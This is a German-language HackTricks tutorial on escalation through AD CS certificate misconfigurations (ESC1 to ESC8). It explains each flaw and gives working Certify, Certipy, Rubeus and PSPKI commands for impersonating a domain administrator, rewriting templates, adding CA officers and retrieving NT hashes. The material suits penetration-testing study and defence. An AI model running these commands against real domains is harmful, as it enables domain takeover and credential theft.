# AD CS Domain-Eskalation

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Null auf Heldenniveau mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

**Dies ist eine Zusammenfassung der Eskalationstechniken der Beiträge:**
* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Fehlkonfigurierte Zertifikatvorlagen - ESC1

### Erklärung

### Erklärung der fehlkonfigurierten Zertifikatvorlagen - ESC1

* **Anmeldeberechtigungen werden niedrig privilegierten Benutzern vom Enterprise CA gewährt.**
* **Managergenehmigung ist nicht erforderlich.**
* **Es sind keine Signaturen von autorisiertem Personal erforderlich.**
* **Die Sicherheitsdeskriptoren auf den Zertifikatvorlagen sind übermäßig freizügig konfiguriert, sodass niedrig privilegierte Benutzer Anmeldeberechtigungen erhalten können.**
* **Die Zertifikatvorlagen sind so konfiguriert, dass sie EKUs definieren, die die Authentifizierung erleichtern:**
* Erweiterte Schlüsselverwendung (EKU)-Kennungen wie Client-Authentifizierung (OID 1.3.6.1.5.5.7.3.2), PKINIT-Client-Authentifizierung (1.3.6.1.5.2.3.4), Smartcard-Anmeldung (OID 1.3.6.1.4.1.311.20.2.2), Jeder Zweck (OID 2.5.29.37.0) oder keine EKU (SubCA) sind enthalten.
* **Die Möglichkeit, dass Antragsteller eine subjectAltName in der Certificate Signing Request (CSR) angeben können, ist in der Vorlage erlaubt:**
* Das Active Directory (AD) priorisiert den subjectAltName (SAN) in einem Zertifikat zur Identitätsüberprüfung, wenn er vorhanden ist. Dies bedeutet, dass durch Angabe des SAN in einer CSR ein Zertifikat angefordert werden kann, um sich als beliebiger Benutzer (z. B. ein Domänenadministrator) auszugeben. Ob ein SAN vom Antragsteller angegeben werden kann, wird im AD-Objekt der Zertifikatvorlage durch die Eigenschaft `mspki-certificate-name-flag` angezeigt. Diese Eigenschaft ist ein Bitmask, und das Vorhandensein des Flags `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` erlaubt die Angabe des SAN durch den Antragsteller.

{% hint style="danger" %}
Die beschriebene Konfiguration ermöglicht es niedrig privilegierten Benutzern, Zertifikate mit beliebigen SANs anzufordern, was eine Authentifizierung als beliebiger Domänenprinzipal über Kerberos oder SChannel ermöglicht.
{% endhint %}

Diese Funktion wird manchmal aktiviert, um die dynamische Generierung von HTTPS- oder Hostzertifikaten durch Produkte oder Bereitstellungsdienste zu unterstützen oder aufgrund mangelnden Verständnisses.

Es wird darauf hingewiesen, dass das Erstellen eines Zertifikats mit dieser Option eine Warnung auslöst, was nicht der Fall ist, wenn eine vorhandene Zertifikatvorlage (wie die Vorlage `WebServer`, bei der `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` aktiviert ist) dupliziert und dann modifiziert wird, um eine Authentifizierungs-OID einzuschließen.

### Missbrauch

Um **anfällige Zertifikatvorlagen zu finden**, können Sie Folgendes ausführen:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Um diese Schwachstelle zu missbrauchen und sich als Administrator auszugeben, könnte man Folgendes ausführen:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Dann können Sie das generierte Zertifikat in das `.pfx`-Format umwandeln und es erneut verwenden, um sich mit Rubeus oder certipy zu authentifizieren:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Die Windows-Binärdateien "Certreq.exe" & "Certutil.exe" können verwendet werden, um das PFX zu generieren: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Die Aufzählung der Zertifikatvorlagen innerhalb des Konfigurationsschemas des AD-Forest, insbesondere solche, die keine Genehmigung oder Signatur erfordern, die über eine Client-Authentifizierung oder eine Smart-Card-Anmeldung EKU verfügen und bei denen die Flagge `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` aktiviert ist, kann durch Ausführen der folgenden LDAP-Abfrage durchgeführt werden:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Fehlkonfigurierte Zertifikatvorlagen - ESC2

### Erklärung

Das zweite Missbrauchsszenario ist eine Variation des ersten:

1. Die Anmeldeberechtigungen werden von der Enterprise-CA an Benutzer mit niedrigen Privilegien vergeben.
2. Die Anforderung für die Genehmigung durch den Manager ist deaktiviert.
3. Die Notwendigkeit autorisierter Signaturen wird ausgelassen.
4. Ein übermäßig freizügiger Sicherheitsdeskriptor auf der Zertifikatvorlage gewährt Benutzern mit niedrigen Privilegien das Recht zur Zertifikatserstellung.
5. **Die Zertifikatvorlage ist so definiert, dass sie die Any Purpose EKU oder keine EKU enthält.**

Die **Any Purpose EKU** erlaubt es einem Angreifer, ein Zertifikat für **beliebige Zwecke** zu erhalten, einschließlich Client-Authentifizierung, Server-Authentifizierung, Code-Signierung usw. Die gleiche **Technik wie bei ESC3** kann verwendet werden, um dieses Szenario auszunutzen.

Zertifikate ohne EKUs, die als untergeordnete CA-Zertifikate fungieren, können für **beliebige Zwecke** ausgenutzt werden und können **auch zum Signieren neuer Zertifikate verwendet werden**. Ein Angreifer könnte daher beliebige EKUs oder Felder in den neuen Zertifikaten angeben, indem er ein untergeordnetes CA-Zertifikat verwendet.

Jedoch werden neue Zertifikate für **Domänenauthentifizierung** nicht funktionieren, wenn die untergeordnete CA nicht vom **`NTAuthCertificates`**-Objekt als vertrauenswürdig eingestuft wird, was die Standardkonfiguration ist. Dennoch kann ein Angreifer weiterhin **neue Zertifikate mit beliebigen EKUs** und beliebigen Zertifikatswerten erstellen. Diese könnten potenziell für eine Vielzahl von Zwecken missbraucht werden (z. B. Code-Signierung, Server-Authentifizierung usw.) und könnten erhebliche Auswirkungen auf andere Anwendungen im Netzwerk wie SAML, AD FS oder IPSec haben.

Um Vorlagen zu ermitteln, die diesem Szenario in der Konfigurationsschema des AD-Forest entsprechen, kann die folgende LDAP-Abfrage ausgeführt werden:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Fehlkonfigurierte Enrolment-Agent-Vorlagen - ESC3

### Erklärung

Dieses Szenario ist ähnlich wie das erste und zweite, missbraucht jedoch eine andere EKU (Zertifikatsanforderungs-Agent) und 2 verschiedene Vorlagen (daher hat es 2 Anforderungssätze).

Die EKU "Zertifikatsanforderungs-Agent" (OID 1.3.6.1.4.1.311.20.2.1), auch als "Enrollment Agent" in der Microsoft-Dokumentation bekannt, ermöglicht es einem Prinzipal, sich im Namen eines anderen Benutzers für ein Zertifikat zu registrieren.

Der "Enrollment Agent" meldet sich in einer solchen Vorlage an und verwendet das resultierende Zertifikat, um im Namen des anderen Benutzers eine CSR mitzuunterzeichnen. Anschließend sendet er die mitunterzeichnete CSR an die CA, meldet sich in einer Vorlage an, die "Anmelden im Namen von" erlaubt, und die CA antwortet mit einem Zertifikat, das dem "anderen" Benutzer gehört.

**Anforderungen 1:**

- Anmelderechte werden von der Enterprise-CA an Benutzer mit niedrigen Privilegien vergeben.
- Die Anforderung für die Genehmigung durch den Manager wird ausgelassen.
- Keine Anforderung für autorisierte Signaturen.
- Der Sicherheitsdeskriptor der Zertifikatsvorlage ist übermäßig freizügig und gewährt Anmelderechte an Benutzer mit niedrigen Privilegien.
- Die Zertifikatsvorlage enthält die EKU des Zertifikatsanforderungs-Agenten, die die Anforderung anderer Zertifikatsvorlagen im Namen anderer Prinzipale ermöglicht.

**Anforderungen 2:**

- Die Enterprise-CA gewährt Anmelderechte an Benutzer mit niedrigen Privilegien.
- Die Genehmigung durch den Manager wird umgangen.
- Die Schemaversion der Vorlage ist entweder 1 oder überschreitet 2 und gibt eine Anwendungsrichtlinien-Ausgabeanforderung an, die die EKU des Zertifikatsanforderungs-Agenten erfordert.
- Eine in der Zertifikatsvorlage definierte EKU ermöglicht die Domänenauthentifizierung.
- Einschränkungen für Anmeldungsagenten werden auf der CA nicht angewendet.

### Missbrauch

Sie können [**Certify**](https://github.com/GhostPack/Certify) oder [**Certipy**](https://github.com/ly4k/Certipy) verwenden, um dieses Szenario auszunutzen:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Die **Benutzer**, die berechtigt sind, ein **Enrollment-Agent-Zertifikat** zu **erhalten**, die Vorlagen, in denen Enrollment **Agents** berechtigt sind, sich einzuschreiben, und die **Konten**, für die der Enrollment-Agent handeln darf, können von Unternehmens-CAs eingeschränkt werden. Dies wird erreicht, indem das `certsrc.msc`-**Snap-In** geöffnet wird, mit der rechten Maustaste auf die CA geklickt wird, auf "Eigenschaften" geklickt wird und dann zum Tab "Enrollment Agents" navigiert wird.

Es ist jedoch zu beachten, dass die **Standard**-Einstellung für CAs "Enrollment Agents nicht einschränken" ist. Wenn die Einschränkung für Enrollment Agents von Administratoren aktiviert wird, indem sie auf "Enrollment Agents einschränken" gesetzt wird, bleibt die Standardkonfiguration äußerst freizügig. Sie ermöglicht **Jedermann** den Zugriff auf alle Vorlagen als jeder.

## Verwundbare Zugriffssteuerung für Zertifikatvorlagen - ESC4

### **Erklärung**

Der **Sicherheitsdeskriptor** auf **Zertifikatvorlagen** definiert die **Berechtigungen**, die bestimmte **AD-Prinzipale** in Bezug auf die Vorlage besitzen.

Wenn ein **Angreifer** die erforderlichen **Berechtigungen** besitzt, um eine **Vorlage** zu **ändern** und die in den **vorherigen Abschnitten** beschriebenen **ausnutzbaren Fehlkonfigurationen** einzuführen, kann eine Privileg-Eskalation ermöglicht werden.

Bemerkenswerte Berechtigungen, die auf Zertifikatvorlagen anwendbar sind, umfassen:

- **Owner:** Gewährt implizite Kontrolle über das Objekt und ermöglicht die Änderung beliebiger Attribute.
- **FullControl:** Ermöglicht umfassende Autorität über das Objekt, einschließlich der Möglichkeit, beliebige Attribute zu ändern.
- **WriteOwner:** Erlaubt die Änderung des Eigentümers des Objekts zu einem Prinzipal unter der Kontrolle des Angreifers.
- **WriteDacl:** Ermöglicht die Anpassung von Zugriffskontrollen und kann einem Angreifer FullControl gewähren.
- **WriteProperty:** Ermöglicht die Bearbeitung beliebiger Objekteigenschaften.

### Missbrauch

Ein Beispiel für eine Privileg-Eskalation wie zuvor:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4 tritt auf, wenn ein Benutzer Schreibrechte für eine Zertifikatvorlage hat. Dies kann beispielsweise dazu missbraucht werden, die Konfiguration der Zertifikatvorlage zu überschreiben und die Vorlage anfällig für ESC1 zu machen.

Wie wir im obigen Pfad sehen können, hat nur `JOHNPC` diese Berechtigungen, aber unser Benutzer `JOHN` hat die neue Kante `AddKeyCredentialLink` zu `JOHNPC`. Da diese Technik mit Zertifikaten zusammenhängt, habe ich diesen Angriff ebenfalls implementiert, der als [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) bekannt ist. Hier ist ein kleiner Einblick in den Befehl `shadow auto` von Certipy, um den NT-Hash des Opfers abzurufen.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** kann die Konfiguration einer Zertifikatvorlage mit einem einzigen Befehl überschreiben. Standardmäßig überschreibt Certipy die Konfiguration, um sie anfällig für ESC1 zu machen. Wir können auch den Parameter **`-save-old` angeben, um die alte Konfiguration zu speichern**, was nützlich sein wird, um die Konfiguration nach unserem Angriff wiederherzustellen.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Verwundbare PKI-Objektzugriffskontrolle - ESC5

### Erklärung

Das umfangreiche Netzwerk von miteinander verbundenen ACL-basierten Beziehungen, das über Zertifikatvorlagen und die Zertifizierungsstelle hinausgeht, kann die Sicherheit des gesamten AD CS-Systems beeinträchtigen. Diese Objekte, die die Sicherheit erheblich beeinflussen können, umfassen:

* Das AD-Computerobjekt des CA-Servers, das durch Mechanismen wie S4U2Self oder S4U2Proxy kompromittiert werden kann.
* Der RPC/DCOM-Server des CA-Servers.
* Jedes untergeordnete AD-Objekt oder Container innerhalb des spezifischen Containerpfads `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Dieser Pfad umfasst unter anderem Container und Objekte wie den Zertifikatvorlagen-Container, den Zertifizierungsstellen-Container, das NTAuthCertificates-Objekt und den Enrollment Services-Container.

Die Sicherheit des PKI-Systems kann beeinträchtigt werden, wenn ein niedrigprivilegierter Angreifer die Kontrolle über eine dieser kritischen Komponenten erlangt.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Erklärung

Das in dem [**CQure Academy-Beitrag**](https://cqureacademy.com/blog/enhanced-key-usage) behandelte Thema berührt auch die Auswirkungen der Flagge **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, wie von Microsoft beschrieben. Diese Konfiguration erlaubt es, wenn sie auf einer Zertifizierungsstelle (CA) aktiviert ist, das Hinzufügen von **benutzerdefinierten Werten** im **alternativen Namen des Subjekts** für **jede Anforderung**, einschließlich solcher, die aus Active Directory® erstellt wurden. Dadurch kann ein **Eindringling** sich über **eine beliebige Vorlage** für die **Domänenauthentifizierung** einschreiben, insbesondere solche, die für die Einschreibung von **nicht privilegierten** Benutzern geöffnet sind, wie die Standardbenutzervorlage. Als Ergebnis kann ein Zertifikat gesichert werden, das es dem Eindringling ermöglicht, sich als Domänenadministrator oder **eine andere aktive Entität** in der Domäne zu authentifizieren.

**Hinweis**: Der Ansatz zum Hinzufügen von **alternativen Namen** zu einem Certificate Signing Request (CSR) durch das Argument `-attrib "SAN:"` in `certreq.exe` (als "Name Value Pairs" bezeichnet) stellt einen **Unterschied** zur Ausbeutungsstrategie von SANs in ESC1 dar. Hier liegt der Unterschied darin, wie Kontoinformationen **innerhalb eines Zertifikatsattributs** und nicht in einer Erweiterung verkapselt werden.

### Missbrauch

Um zu überprüfen, ob die Einstellung aktiviert ist, können Organisationen den folgenden Befehl mit `certutil.exe` verwenden:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Diese Operation verwendet im Wesentlichen den **Remote-Registrierungszugriff**, daher könnte ein alternativer Ansatz sein:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Tools wie [**Certify**](https://github.com/GhostPack/Certify) und [**Certipy**](https://github.com/ly4k/Certipy) können diese Fehlkonfiguration erkennen und ausnutzen.
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Um diese Einstellungen zu ändern, vorausgesetzt man hat **Domänenadministrationsrechte** oder äquivalente Rechte, kann der folgende Befehl von jedem Arbeitsplatz aus ausgeführt werden:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Um diese Konfiguration in Ihrer Umgebung zu deaktivieren, kann die Flagge mit folgendem Befehl entfernt werden:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Nach den Sicherheitsupdates im Mai 2022 enthalten neu ausgestellte **Zertifikate** eine **Sicherheitserweiterung**, die die **`objectSid`-Eigenschaft des Antragstellers** enthält. Für ESC1 wird diese SID aus dem angegebenen SAN abgeleitet. Für **ESC6** spiegelt die SID jedoch die **`objectSid` des Antragstellers** wider, nicht das SAN.\
Um ESC6 auszunutzen, ist es wichtig, dass das System anfällig für ESC10 (Schwache Zertifikat-Zuordnungen) ist, das das **SAN über die neue Sicherheitserweiterung** priorisiert.
{% endhint %}

## Verwundbare Zugriffskontrolle für Zertifizierungsstellen - ESC7

### Angriff 1

#### Erklärung

Der Zugriff auf eine Zertifizierungsstelle wird durch eine Reihe von Berechtigungen geregelt, die die Aktionen der CA steuern. Diese Berechtigungen können über den Zugriff auf `certsrv.msc` eingesehen werden, indem Sie mit der rechten Maustaste auf eine CA klicken, Eigenschaften auswählen und dann zum Sicherheitstab wechseln. Darüber hinaus können Berechtigungen mithilfe des PSPKI-Moduls mit Befehlen wie:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Dies bietet Einblicke in die Hauptrechte, nämlich **`ManageCA`** und **`ManageCertificates`**, die den Rollen "CA-Administrator" bzw. "Zertifikatsmanager" entsprechen.

#### Missbrauch

Das Vorhandensein von **`ManageCA`**-Rechten auf einer Zertifizierungsstelle ermöglicht es dem Prinzipal, Einstellungen remote über PSPKI zu manipulieren. Dies umfasst das Umschalten des Flags **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, um die Angabe von SAN in jeder Vorlage zu ermöglichen, ein entscheidender Aspekt der Domänen-Eskalation.

Die Vereinfachung dieses Prozesses ist durch die Verwendung des PSPKI-Cmdlets **Enable-PolicyModuleFlag** möglich, das Modifikationen ohne direkte GUI-Interaktion ermöglicht.

Der Besitz von **`ManageCertificates`**-Rechten erleichtert die Genehmigung ausstehender Anfragen und umgeht effektiv die Sicherheitsvorkehrung "Genehmigung durch den CA-Zertifikatsmanager".

Eine Kombination der Module **Certify** und **PSPKI** kann verwendet werden, um ein Zertifikat anzufordern, zu genehmigen und herunterzuladen:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Angriff 2

#### Erklärung

{% hint style="warning" %}
Im **vorherigen Angriff** wurden die Berechtigungen **`Manage CA`** verwendet, um die Flagge **EDITF\_ATTRIBUTESUBJECTALTNAME2** zu aktivieren und den **ESC6-Angriff** durchzuführen. Dies hat jedoch keine Auswirkungen, bis der CA-Dienst (`CertSvc`) neu gestartet wird. Wenn ein Benutzer das Zugriffsrecht **`Manage CA`** hat, darf der Benutzer auch den Dienst neu starten. Dies bedeutet jedoch nicht, dass der Benutzer den Dienst remote neu starten kann. Darüber hinaus funktioniert **ESC6** in den meisten gepatchten Umgebungen aufgrund der Sicherheitsupdates vom Mai 2022 möglicherweise nicht von Anfang an.
{% endhint %}

Daher wird hier ein weiterer Angriff vorgestellt.

Voraussetzungen:

* Nur **`ManageCA`-Berechtigung**
* **`Manage Certificates`-Berechtigung** (kann von **`ManageCA`** gewährt werden)
* Zertifikatvorlage **`SubCA`** muss **aktiviert** sein (kann von **`ManageCA`** aktiviert werden)

Die Technik basiert darauf, dass Benutzer mit dem Zugriffsrecht **`Manage CA`** _und_ **`Manage Certificates`** **fehlgeschlagene Zertifikatsanfragen** stellen können. Die Zertifikatvorlage **`SubCA`** ist anfällig für ESC1, aber **nur Administratoren** können sich in der Vorlage einschreiben. Daher kann ein **Benutzer** beantragen, sich in der **`SubCA`** einzuschreiben - was **abgelehnt** wird - aber **dann vom Manager ausgestellt** wird.

#### Missbrauch

Sie können sich selbst das Zugriffsrecht **`Manage Certificates`** gewähren, indem Sie Ihren Benutzer als neuen Offizier hinzufügen.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Die **`SubCA`** Vorlage kann mit dem Parameter `-enable-template` auf der CA **aktiviert werden**. Standardmäßig ist die `SubCA` Vorlage aktiviert.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Wenn wir die Voraussetzungen für diesen Angriff erfüllt haben, können wir damit beginnen, **eine Zertifikatsanforderung basierend auf der `SubCA`-Vorlage zu stellen**.

**Diese Anforderung wird abgelehnt**, aber wir werden den privaten Schlüssel speichern und die Anforderungs-ID notieren.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Mit unserer **`Manage CA` und `Manage Certificates`** können wir dann **den fehlgeschlagenen Zertifikatsantrag** mit dem `ca`-Befehl und dem Parameter `-issue-request <Anforderungs-ID>` ausstellen.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Und schließlich können wir das ausgestellte Zertifikat mit dem Befehl `req` und dem Parameter `-retrieve <Anforderungs-ID>` abrufen.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM-Relais zu AD CS HTTP-Endpunkten - ESC8

### Erklärung

{% hint style="info" %}
In Umgebungen, in denen **AD CS installiert ist**, besteht die Möglichkeit, dass ein **verwundbarer Web-Registrierungs-Endpunkt** vorhanden ist und mindestens eine **Zertifikatvorlage veröffentlicht ist**, die **die Anmeldung von Domänencomputern und die Clientauthentifizierung** erlaubt (wie z.B. die Standardvorlage **`Machine`**). Dadurch wird es möglich, dass **jeder Computer mit aktivem Spooler-Dienst von einem Angreifer kompromittiert werden kann**!
{% endhint %}

AD CS unterstützt mehrere **HTTP-basierte Registrierungsmethoden**, die über zusätzliche Serverrollen verfügbar gemacht werden können. Diese Schnittstellen für die HTTP-basierte Zertifikatsregistrierung sind anfällig für **NTLM-Relaisangriffe**. Ein Angreifer kann von einer **kompromittierten Maschine aus** ein beliebiges AD-Konto vortäuschen, das über NTLM authentifiziert wird. Während er das Opferkonto vortäuscht, kann ein Angreifer über diese Web-Schnittstellen einen **Clientauthentifizierungszertifikat mit den Vorlagen `User` oder `Machine`** anfordern.

* Die **Web-Registrierungsschnittstelle** (eine ältere ASP-Anwendung, die unter `http://<caserver>/certsrv/` verfügbar ist) ist standardmäßig nur über HTTP erreichbar und bietet keinen Schutz vor NTLM-Relaisangriffen. Darüber hinaus erlaubt sie explizit nur die NTLM-Authentifizierung über den Autorisierungs-HTTP-Header, wodurch sicherere Authentifizierungsmethoden wie Kerberos nicht anwendbar sind.
* Der **Zertifikatregistrierungsdienst** (CES), der **Zertifikatregistrierungsrichtlinien** (CEP) Webdienst und der **Netzwerkgeräte-Registrierungsdienst** (NDES) unterstützen standardmäßig die Verhandlungsauthentifizierung über ihren Autorisierungs-HTTP-Header. Die Verhandlungsauthentifizierung unterstützt sowohl Kerberos als auch NTLM und ermöglicht es einem Angreifer, während eines Relaisangriffs auf NTLM-Authentifizierung herabzustufen. Obwohl diese Webdienste standardmäßig HTTPS unterstützen, bietet HTTPS allein keinen Schutz vor NTLM-Relaisangriffen. Schutz vor NTLM-Relaisangriffen für HTTPS-Dienste ist nur möglich, wenn HTTPS mit Kanalbindung kombiniert wird. Leider aktiviert AD CS Extended Protection for Authentication auf IIS nicht, was für die Kanalbindung erforderlich ist.

Ein häufiges **Problem** bei NTLM-Relaisangriffen ist die **kurze Dauer der NTLM-Sitzungen** und die Unfähigkeit des Angreifers, mit Diensten zu interagieren, die **NTLM-Signierung erfordern**.

Diese Einschränkung wird jedoch durch Ausnutzung eines NTLM-Relaisangriffs überwunden, um ein Zertifikat für den Benutzer zu erhalten, da die Gültigkeitsdauer des Zertifikats die Dauer der Sitzung bestimmt und das Zertifikat mit Diensten verwendet werden kann, die **NTLM-Signierung vorschreiben**. Für Anweisungen zur Verwendung eines gestohlenen Zertifikats siehe:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Eine weitere Einschränkung von NTLM-Relaisangriffen besteht darin, dass **eine von einem Angreifer kontrollierte Maschine von einem Opferkonto authentifiziert werden muss**. Der Angreifer könnte entweder warten oder versuchen, diese Authentifizierung **zu erzwingen**:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Missbrauch**

[**Certify**](https://github.com/GhostPack/Certify)'s `cas` ermittelt **aktivierte HTTP-AD-CS-Endpunkte**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

Die Eigenschaft `msPKI-Enrollment-Servers` wird von Unternehmenszertifizierungsstellen (CAs) verwendet, um Endpunkte des Zertifikatanmeldedienstes (CES) zu speichern. Diese Endpunkte können analysiert und aufgelistet werden, indem das Tool **Certutil.exe** verwendet wird:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
#### Missbrauch mit Certify

Certify ist ein Werkzeug, das verwendet werden kann, um Zertifikate in einer Active Directory-Domäne zu missbrauchen. Es ermöglicht einem Angreifer, sich als ein anderer Benutzer auszugeben, indem es ein Zertifikat mit den Anmeldeinformationen eines anderen Benutzers erstellt.

